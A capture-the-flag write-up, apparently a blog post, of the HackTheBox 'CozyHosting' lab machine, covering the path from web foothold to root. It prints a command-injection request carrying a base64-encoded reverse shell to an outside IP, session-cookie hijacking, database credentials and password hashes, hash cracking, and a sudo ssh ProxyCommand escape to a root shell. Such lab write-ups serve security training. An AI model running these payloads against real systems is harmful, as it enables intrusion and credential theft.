---
layout: post
title: HTB{CozyHosting}
author: mr4ndr3w
tags: [write-up, hackthebox, machine, linux]
---
<!--cut-->

* TOC
{:toc}


### USER:

Directory Fuzzing:

```text
┌──(kali㉿kali)-[~/htb/machines/CozyHosting]
└─$ dirsearch -u http://cozyhosting.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/cozyhosting.htb/-_23-10-18_03-58-15.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-10-18_03-58-15.log

Target: http://cozyhosting.htb/

[03:58:15] Starting: 
[03:58:22] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[03:58:24] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[03:58:25] 400 -  435B  - /a%5c.aspx
[03:58:26] 200 -  634B  - /actuator
[03:58:26] 200 -    5KB - /actuator/env
[03:58:26] 200 -  489B  - /actuator/sessions
[03:58:26] 200 -   15B  - /actuator/health
[03:58:26] 200 -   10KB - /actuator/mappings
[03:58:26] 200 -  124KB - /actuator/beans
[03:58:26] 401 -   97B  - /admin
[03:58:40] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[03:58:40] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[03:58:40] 500 -   73B  - /error
[03:58:41] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[03:58:41] 200 -    0B  - /extjs/resources//charts.swf
[03:58:43] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[03:58:43] 200 -   12KB - /index
[03:58:46] 200 -    4KB - /login
[03:58:46] 200 -    0B  - /login.wdm%2e
[03:58:46] 204 -    0B  - /logout
[03:58:55] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed

```
The `sessions` directory held what I was certain was a cookie. I dropped it into the storage on my browser using devtools and used it to bypass the login page!

If we leave the ‘Param Username’ section empty, we observe an error related to an SSH command, indicating a potential Command Injection vulnerability in this section.



Request:

```text
POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Cookie: JSESSIONID=BD799703BBE10854790ECE0682ADE90D
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

host=localhost&username=;echo${IFS}cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjEzMCIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=|base64${IFS}-d|/bin/bash;
```

When we employ the ‘ls’ command to inspect the files, we discover the presence of a .jar file. We proceed to open a port for downloading the .jar file, and then explore its contents to see what’s inside.
Once the download is finished, extract the file, and you will find the Postgres Username and Password.

```text
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

And now, we are connecting to Postgres.


```text
$ pg_dump --dbname=postgresql://postgres:'Vg&nvzAQ7XxR'@127.0.0.1:5432/cozyhosting

COPY public.users (name, password, role) FROM stdin;
kanderson   $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim    User
admin   $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm    Admin
\.

```
I cracked the hash using john.

```text
┌──(kali㉿kali)-[~/htb/machines/CozyHosting]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:13 DONE (2023-10-18 05:17) 0.07446g/s 209.0p/s 209.0c/s 209.0C/s hellomoto..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```


Connect with ssh `josh` with password: `manchesterunited`.

```text
┌──(kali㉿kali)-[~/htb/machines/CozyHosting]
└─$ ssh josh@10.10.11.230   
The authenticity of host '10.10.11.230 (10.10.11.230)' can't be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.230' (ED25519) to the list of known hosts.
josh@10.10.11.230's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 18 09:17:25 AM UTC 2023

  System load:           0.0166015625
  Usage of /:            57.0% of 5.42GB
  Memory usage:          48%
  Swap usage:            0%
  Processes:             333
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.230
  IPv6 address for eth0: dead:beef::250:56ff:feb9:4a11

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 18 09:12:17 2023 from 10.10.14.61
josh@cozyhosting:~$ cat user.txt 
dae4a6561d629f4505b2c9e6003c4d83

```
### ROOT:


I listed the commands josh could run as root.

```text
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

We observe that SSH can be executed with root privileges. Let’s utilize the payload from GTFO BIN.

```text
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# cat /root/root.txt
601781d9be2fddd42ee16a485c8cb903
# cat /etc/shadow
root:$y$j9T$nK3A0N4wTEzopZkv8GQds0$NlR46AiiQOChoO1UNpiOYFIBHM7s956G8l8p/w15Sp2:19577:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19486:0:99999:7:::
lxd:!:19486::::::
app:!:19486:0:99999:7:::
postgres:*:19487:0:99999:7:::
josh:$y$j9T$QbN44OK6RyyP01EL9VkVU0$n/uszgmCRdbeaF9OiCVna63BwZCtG.SLHXEXVeluy.1:19498:0:99999:7:::
_laurel:!:19583::::::
```

